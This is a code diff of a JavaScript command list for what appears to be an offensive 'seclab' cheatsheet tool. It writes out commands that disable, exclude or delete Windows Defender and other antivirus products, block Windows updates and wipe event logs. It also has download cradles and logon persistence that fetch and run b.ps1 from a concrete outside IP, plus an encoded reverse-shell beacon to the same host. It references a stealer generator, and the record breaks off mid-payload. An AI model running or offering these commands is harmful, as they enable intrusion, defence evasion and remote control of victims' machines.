@@ -420,2214 +420,2583 @@ const COMMANDS = [
   },
   {
     title: "Deploy Receiver Pro on Port 8082",
+    desc: "Changes receiver_pro.py to port 8082 and starts in screen session.",
     code: "cd /opt\nsed -i 's/port=8081/port=8082/g' receiver_pro.py\nscreen -S receiver_pro\npython3 receiver_pro.py",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Check All Receivers",
+    desc: "Health check all receiver endpoints. Run on VPS to verify services.",
     code: "curl http://localhost:8080/health  # Original\ncurl http://localhost:8081/health  # Killchain\ncurl http://localhost:8082/health  # Pro",
     tags: ["vps", "linux"],
     accent: "#ffee00"
   },
   {
     title: "Generate Killchain Pro Report",
-    code: "cd C:\\Users\\veren\\seclab\\killchain-stealer\npython generator_killchain_pro.py",
+    desc: "Generates a killchain pro report from the stealer module.",
+    code: "cd C:\\Users\\adminvm1\\seclab\\killchain-stealer\npython generator_killchain_pro.py",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Check Defender Exclusions",
+    desc: "Lists all Defender exclusion paths. Check before deploying payloads.",
     code: "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Exclusions (Detailed)",
+    desc: "Shows all exclusion types: paths, processes, and extensions.",
     code: "Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - AppData",
+    desc: "Excludes AppData\\Roaming from Defender scanning. Common payload drop zone.",
     code: "Add-MpPreference -ExclusionPath \"$env:APPDATA\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - ProgramData",
+    desc: "Excludes C:\\ProgramData from scanning. Good for persistence payloads.",
     code: "Add-MpPreference -ExclusionPath \"C:\\ProgramData\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - Windows Tasks",
+    desc: "Excludes C:\\Windows\\Tasks. Writable by standard users.",
     code: "Add-MpPreference -ExclusionPath \"C:\\Windows\\Tasks\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - Payload Path",
-    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\asi\\AppData\\Roaming\\payload.exe\"",
+    desc: "Excludes specific payload file. Change path to your drop location.",
+    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\adminvm1\\AppData\\Roaming\\payload.exe\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - User Roaming",
-    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\singh\\AppData\\Roaming\"",
+    desc: "Excludes entire user Roaming folder. Broad exclusion for payload staging.",
+    code: "Add-MpPreference -ExclusionPath \"C:\\Users\\adminvm1\\AppData\\Roaming\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - BAT Extension",
+    desc: "Excludes all .bat files from scanning. Use for batch payloads.",
     code: "Add-MpPreference -ExclusionExtension \".bat\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - EXE Extension",
+    desc: "Excludes all .exe files. Nuclear option - disables most scanning.",
     code: "Add-MpPreference -ExclusionExtension \".exe\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Add Exclusion - PowerShell",
+    desc: "Excludes PowerShell process from scanning. Enables PS-based payloads.",
     code: "Add-MpPreference -ExclusionProcess \"powershell.exe\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Removed Threats",
+    desc: "Lists threats that Defender removed. See what got caught.",
     code: "Get-MpThreat | Sort-Object LastDetectedTime -Descending",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Threat Detections",
+    desc: "Shows threat name, file path, and detection time. Debug payload failures.",
     code: "Get-MpThreatDetection | Sort-Object InitialDetectionTime -Descending | Select-Object ThreatName, Resources, InitialDetectionTime",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender Realtime",
+    desc: "Disables real-time protection. Requires admin. May be blocked by Tamper Protection.",
     code: "Set-MpPreference -DisableRealtimeMonitoring $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender Behavior Monitoring",
+    desc: "Disables behavior-based detection. Useful for living-off-the-land attacks.",
     code: "Set-MpPreference -DisableBehaviorMonitoring $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender BlockAtFirstSeen",
+    desc: "Disables cloud-based first-sight blocking. Helps novel payloads.",
     code: "Set-MpPreference -DisableBlockAtFirstSeen $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender IOAV",
+    desc: "Disables Office/browser download scanning. Use for document payloads.",
     code: "Set-MpPreference -DisableIOAVProtection $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender PrivacyMode",
+    desc: "Shows actual file paths in threat logs instead of [User].",
     code: "Set-MpPreference -DisablePrivacyMode $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender Signature Updates",
+    desc: "Prevents signature updates on startup. Keeps old definitions.",
     code: "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender Archive Scanning",
+    desc: "Disables ZIP/RAR scanning. Hide payloads in archives.",
     code: "Set-MpPreference -DisableArchiveScanning $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender IPS",
+    desc: "Disables network intrusion prevention. Helps with C2 traffic.",
     code: "Set-MpPreference -DisableIntrusionPreventionSystem $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender Script Scanning",
+    desc: "Disables AMSI script scanning. Key for PS/VBS payloads.",
     code: "Set-MpPreference -DisableScriptScanning $true",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Disable Defender via Registry",
+    desc: "Disables Defender via registry. Requires admin + reboot to take effect.",
     code: "Set-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 -Type DWORD",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Stop WinDefend Service",
+    desc: "Stops Defender service and disables startup. Blocked on modern Windows.",
     code: "Stop-Service -Name \"WinDefend\" -Force\nSet-Service -Name \"WinDefend\" -StartupType Disabled",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Windows Defender (Destructive)",
+    desc: "Takes ownership and deletes Defender folder. DESTRUCTIVE - cannot undo.",
     code: "Takeown /f \"C:\\Program Files\\Windows Defender\" /r /d y\nicacls \"C:\\Program Files\\Windows Defender\" /grant administrators:F /t\nRemove-Item \"C:\\Program Files\\Windows Defender\" -Recurse -Force",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Defender Files Recursive",
+    desc: "Finds and deletes all Windows Defender files across common paths.",
     code: "Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -like \"*Windows Defender*\" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Defender Files (Interactive)",
+    desc: "Lists Defender files and prompts before deletion. Safer than silent delete.",
     code: "$FilesToDelete = Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.FullName -like \"*Windows Defender*\" }; if ($FilesToDelete.Count -gt 0) { Write-Host \"Found the following files/dirs to delete:\" -ForegroundColor Red; $FilesToDelete.FullName; $Confirm = Read-Host \"Continue? (y/N)\"; if ($Confirm -eq 'y') { $FilesToDelete | Remove-Item -Force -Recurse -Verbose } } else { Write-Host \"No matching files found.\" -ForegroundColor Green }",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Other AV Files",
+    desc: "Nukes all major AV vendor files. Scorched earth - use with caution.",
     code: "Get-ChildItem -Path $env:ProgramFiles, $env:ProgramData, ${env:ProgramFiles(x86)} -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -match \"Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET|Norton\" } | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Stop Windows Update",
+    desc: "Stop and disable Windows Update service, then clear the download cache.",
     code: "Stop-Service wuauserv -Force\nSet-Service wuauserv -StartupType Disabled\nRemove-Item -Recurse -Force \"C:\\Windows\\SoftwareDistribution\\Download\\*\"",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Windows Update Tasks",
+    desc: "Remove Windows Update scheduled tasks to prevent auto-updates.",
     code: "schtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\Scheduled Start\" /F\nschtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\sih\" /F\nschtasks /Delete /TN \"Microsoft\\Windows\\WindowsUpdate\\sihboot\" /F",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Disable Windows Update Registry",
+    desc: "Set registry policy to disable automatic Windows updates.",
     code: "New-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Force\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" -Name NoAutoUpdate -PropertyType DWord -Value 1 -Force",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Block Windows Update Firewall",
+    desc: "Block Microsoft update servers via outbound firewall rule.",
     code: "New-NetFirewallRule -DisplayName \"Block Windows Update\" -Direction Outbound -RemoteAddress 20.190.128.0/18,40.126.0.0/18 -Action Block",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Verify Windows Update Status",
+    desc: "Check if Windows Update service is disabled and registry policy is set.",
     code: "Get-Service wuauserv\nGet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\"",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "List PS/BAT/VBS Scheduled Tasks",
+    desc: "Find scheduled tasks that run PowerShell, batch, or VBScript files.",
     code: "schtasks /query /fo LIST /v | Select-String -Pattern \"\\.ps1|\\.bat|\\.vbs\"",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Delete PS/BAT/VBS Scheduled Tasks",
+    desc: "Remove all scheduled tasks that execute script files.",
     code: "schtasks /query /fo LIST /v | Select-String \"TaskName|Task To Run\" -Context 0,1 | Where-Object { $_.ToString() -match \"TaskName\" -and $_.Context.PostContext[0] -match '\\.ps1|\\.bat|\\.vbs' } | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Delete All Scheduled Tasks (DANGEROUS)",
+    desc: "Delete every scheduled task on the system. Will break Windows functionality.",
     code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | ForEach-Object { schtasks /delete /tn $_ /f }",
     tags: ["ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Only Defender Tasks",
+    desc: "Remove Windows Defender scheduled tasks to prevent auto-scans.",
     code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | Where-Object { $_ -like \"*Microsoft\\Windows\\Windows Defender*\" } | ForEach-Object { schtasks /delete /tn $_ /f }",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Delete Other AV Tasks",
+    desc: "Remove scheduled tasks for common antivirus products.",
     code: "schtasks /query /fo LIST /v | Select-String \"TaskName\" | ForEach-Object { ($_.ToString() -split \":\",2)[1].Trim() } | Where-Object { $_ -match \"Windows Defender|Defender|Symantec|McAfee|Kaspersky|Avast|AVG|Trend|Sophos|Bitdefender|ESET\" } | ForEach-Object { schtasks /delete /tn $_ /f }",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Defender Realtime Status",
+    desc: "Check if real-time protection is disabled (True = disabled).",
     code: "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Defender Full Status",
+    desc: "Show all key Defender settings including AV mode and signature date.",
     code: "Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, NISEnabled, SignatureUpdateDateTime",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Show Installed AV Products",
+    desc: "List all antivirus products registered with Windows Security Center.",
     code: "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName, pathToSignedProductExe, productState",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Kill AV Processes",
+    desc: "Kill Avast processes. Change '*avast*' to match target AV name.",
     code: "Get-Process | Where-Object { $_.Name -like '*avast*' } | Stop-Process -Force",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Clear Event Viewer Logs",
+    desc: "Wipe PowerShell, Security, System, and Application event logs.",
     code: "wevtutil cl \"Windows PowerShell\"\nwevtutil cl \"Microsoft-Windows-PowerShell/Operational\"\nwevtutil cl \"Security\"\nwevtutil cl \"System\"\nwevtutil cl \"Application\"",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Clear PowerShell History",
+    desc: "Delete the PSReadline history file containing previous commands.",
     code: "Remove-Item (Get-PSReadlineOption).HistorySavePath -Force",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Kill Other PowerShell Processes",
+    desc: "Terminate all PowerShell processes except the current one.",
     code: "$id = $PID\nGet-Process powershell | Where-Object { $_.Id -ne $id } | ForEach-Object { try { $_.Kill() } catch {} }",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "PowerShell Unrestricted Mode",
+    desc: "Bypass execution policy and attempt to escape Constrained Language Mode.",
     code: "Set-ExecutionPolicy Unrestricted -Scope Process -Force\n[System.Management.Automation.Utils]::CachePowerShellAssembly()\n$env:__PSLockdownPolicy=8\n$ExecutionContext.SessionState.LanguageMode = \"FullLanguage\"",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Fileless Beacon (Encoded) - Bypass Web Filters",
+    desc: "Run base64-encoded payload from command line. Generate payload separately.",
     code: "powershell -ep bypass -w hidden -enc [BASE64_ENCODED_PAYLOAD]",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "IEX Download Cradle",
-    code: "IEX(IWR http://VPS_IP:PORT/b.ps1 -UseBasicParsing)",
+    desc: "Download and execute PowerShell script from VPS. Change port as needed.",
+    code: "IEX(IWR http://168.144.166.97:8889/b.ps1 -UseBasicParsing)",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "IEX Net.WebClient (Legacy)",
-    code: "IEX(New-Object Net.WebClient).DownloadString(\"http://VPS_IP:PORT/b.ps1\")",
+    desc: "Legacy download cradle using Net.WebClient for older systems.",
+    code: "IEX(New-Object Net.WebClient).DownloadString(\"http://168.144.166.97:8889/b.ps1\")",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "CMD Download Cradle",
-    code: "powershell -ep bypass -w hidden -nop -c \"IEX(IWR http://VPS_IP:PORT/b.ps1 -UseBasicParsing)\"",
+    desc: "Run download cradle from cmd.exe context with hidden window.",
+    code: "powershell -ep bypass -w hidden -nop -c \"IEX(IWR http://168.144.166.97:8889/b.ps1 -UseBasicParsing)\"",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Certutil Download + Execute",
-    code: "certutil -urlcache -split -f http://VPS_IP:PORT/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
+    desc: "Download payload via certutil (LOLBin) then execute with PowerShell.",
+    code: "certutil -urlcache -split -f http://168.144.166.97:8889/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Bitsadmin Download + Execute",
-    code: "bitsadmin /transfer x http://VPS_IP:PORT/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
+    desc: "Download payload via BITS (LOLBin) then execute with PowerShell.",
+    code: "bitsadmin /transfer x http://168.144.166.97:8889/b.ps1 %TEMP%\\b.ps1 && powershell -ep bypass -f %TEMP%\\b.ps1",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "MSHTA Loader",
+    desc: "Use mshta.exe to spawn PowerShell. Skeleton only - fill in payload.",
     code: "mshta vbscript:Execute(CreateObject(Wscript.Shell).Run powershell...)",
     tags: ["ps", "c2"],
     accent: "#ff6b35"
   },
   {
     title: "Check Current Privileges",
+    desc: "List all privileges assigned to current user token.",
     code: "whoami /priv",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Check User Groups",
+    desc: "Show all groups the current user belongs to including integrity level.",
     code: "whoami /groups",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Check if Admin (High Integrity)",
+    desc: "Check for High Mandatory Level SID - indicates elevated admin shell.",
     code: "whoami /groups | findstr \"S-1-16-12288\"",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Get Local Admins",
+    desc: "List all members of the local Administrators group.",
     code: "net localgroup administrators",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "List All Users",
+    desc: "Show all local user accounts on the system.",
     code: "net user",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Check Unquoted Service Paths",
+    desc: "Find services with unquoted paths outside C:\\Windows for privesc.",
     code: "wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\"",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Check AlwaysInstallElevated",
+    desc: "Check if MSI installers run as SYSTEM. Both keys must be 1 to exploit.",
     code: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Find Stored Credentials",
+    desc: "List saved credentials in Windows Credential Manager.",
     code: "cmdkey /list",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Check Scheduled Tasks",
+    desc: "Show scheduled tasks and their run-as accounts for privesc targets.",
     code: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\"",
     tags: ["ps", "privesc"],
     accent: "#9b59b6"
   },
   {
     title: "Registry Run Key Persistence",
-    code: "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Update\" -Value \"powershell -w hidden -c IEX(...)\"",
+    desc: "Add payload to HKCU Run key. Executes on user logon.",
+    code: "Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"Update\" -Value \"powershell -w hidden -c IEX(IWR http://168.144.166.97:8889/b.ps1 -UseBasicParsing)\"",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Scheduled Task Persistence (SYSTEM)",
-    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(...)\" /sc onlogon /ru SYSTEM",
+    desc: "Create scheduled task running as SYSTEM on any user logon.",
+    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(IWR http://168.144.166.97:8889/b.ps1 -UseBasicParsing)\" /sc onlogon /ru SYSTEM",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Scheduled Task Persistence (User)",
-    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(...)\" /sc onlogon",
+    desc: "Create scheduled task running as current user on logon.",
+    code: "schtasks /create /tn \"Update\" /tr \"powershell -w hidden -c IEX(IWR http://168.144.166.97:8889/b.ps1 -UseBasicParsing)\" /sc onlogon",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Startup Folder Persistence",
-    code: "Copy-Item payload.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\\\"",
+    desc: "Copy payload to Startup folder. Runs on user logon.",
+    code: "Copy-Item payload.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"",
     tags: ["ps", "persist"],
     accent: "#e74c3c"
   },
   {
     title: "Check Firewall Status",
+    desc: "Show which firewall profiles (Domain/Private/Public) are enabled.",
     code: "Get-NetFirewallProfile | Select-Object Name, Enabled",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "List Inbound Allow Rules",
+    desc: "Show all firewall rules allowing inbound connections.",
     code: "Get-NetFirewallRule -Direction Inbound -Action Allow | Select-Object Name, DisplayName",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "Disable Windows Firewall",
+    desc: "Turn off firewall for all profiles. Requires admin.",
     code: "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "Allow Inbound Port",
+    desc: "Create firewall rule allowing inbound TCP on port 4444.",
     code: "New-NetFirewallRule -DisplayName \"Allow4444\" -Direction Inbound -LocalPort 4444 -Protocol TCP -Action Allow",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "netsh Firewall Status",
+    desc: "Show firewall status via netsh (works on older systems).",
     code: "netsh advfirewall show allprofiles",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "netsh Disable Firewall",
+    desc: "Disable firewall via netsh. Requires admin.",
     code: "netsh advfirewall set allprofiles state off",
     tags: ["ps", "firewall"],
     accent: "#3498db"
   },
   {
     title: "Defender Full Status",
+    desc: "Show Defender mode, real-time protection, and tamper protection status.",
     code: "Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check Tamper Protection",
+    desc: "Check if Tamper Protection is enabled (blocks disabling Defender).",
     code: "Get-MpComputerStatus | Select-Object IsTamperProtected, RealTimeProtectionEnabled",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Check WinDefend Service",
+    desc: "Show Windows Defender service status and startup type.",
     code: "Get-Service WinDefend | Select-Object Status, StartType",
     tags: ["defender", "ps"],
     accent: "#ff2a6d"
   },
   {
     title: "Whoami Cmdlet Bypass",
+    desc: "Get current user without calling whoami.exe. Evades process logging.",
     code: "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Hostname Cmdlet Bypass",
+    desc: "Get hostname from environment variable. No external process spawn.",
     code: "$env:COMPUTERNAME",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Username Cmdlet Bypass",
+    desc: "Get username from environment variable. No external process spawn.",
     code: "$env:USERNAME",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Get-Location (pwd)",
+    desc: "Get current working directory path as string.",
     code: "(Get-Location).Path",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "IP Address (Cmdlet)",
+    desc: "List all IP addresses and their interface names.",
     code: "Get-NetIPAddress | Select-Object IPAddress, InterfaceAlias",
     tags: ["ps"],
     accent: "#00f0ff"
   },
   {
     title: "Encoded Beacon (Full)",
+    desc: "Pre-encoded persistent reverse shell. Connects to 168.144.166.97:4444 with auto-reconnect.",
     code: "powershell -ep bypass -w hidden -enc IwAgAFAAZQByAHMAaQBzAHQAZQBuAHQAIAByAGUAdgBlAHIAcwBlACAAcwBoAGUAbABsACAALQAgAGEAdQB0AG8ALQByAGUAYwBvAG4AbgBlAGMAdABzACAAZgBvAHIAZQB2AGUAcgAKACQAaQBwACAAPQAgACIAMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ACIACgAkAHAAbwByAHQAIAA9ACAANAA0ADQANAAKACQAcwBsAGUAZQBwAFMAZQBjAG8AbgBkAHMAIAA9ACAAMQAwAAoACgB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApACAAewAKACAAIAAgACAAdAByAHkAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAkAGkAcAAsACAAJABwAG8AcgB0ACkACgAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoAIAAgACAAIAAgACAAIAAgACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHMAdAByAGUAYQBtACkACgAgACAAIAAgACAAIAAgACAAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwB0AHIAZQBhAG0AKQAKACAAIAAgACAAIAAgACAAIAAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlAAoACgAgACAAIAAgACAAIAAgACAAIwAgAFMAZQBuAGQAIABiAGEAbgBuAGUAcgAKACAAIAAgACAAIAAgACAAIAAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAiAFsAKwBdACAAJABlAG4AdgA6AEMATwBNAFAAVQBUAEUAUgBOAEEATQBFAFwAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQAgAHwAIABQAEkARAA6ACAAJABQAEkARAAiACkACgAKACAAIAAgACAAIAAgACAAIAAjACAAQwBvAG0AbQBhAG4AZAAgAGwAbwBvAHAAIAAtACAAbgBvACAAcAByAG8AbQBwAHQAcwAsACAAagB1AHMAdAAgAHIAZQBhAGQALwBlAHgAZQBjAHUAdABlAC8AcgBlAHMAcABvAG4AZAAKACAAIAAgACAAIAAgACAAIAB3AGgAaQBsAGUAIAAoACQAYwBsAGkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBtAGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAFIAZQBhAGQATABpAG4AZQAoACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAC0AbgBvAHQAIAAkAGMAbQBkACkAIAB7ACAAYgByAGUAYQBrACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABjAG0AZAAgAC0AZQBxACAAIgBlAHgAaQB0ACIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbwB1AHQAcAB1AHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAJABjAG0AZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgAC0AVwBpAGQAdABoACAANAAwADkANgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAJABvAHUAdABwAHUAdAAuAFQAcgBpAG0ARQBuAGQAKAApACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUATABpAG4AZQAoACIAPAA8AEUATgBEAD4APgAiACkAIAAgACMAIABlAG4AZAAgAG0AYQByAGsAZQByACAAZgBvAHIAIABDADIAIAB0AG8AIABkAGUAdABlAGMAdAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIA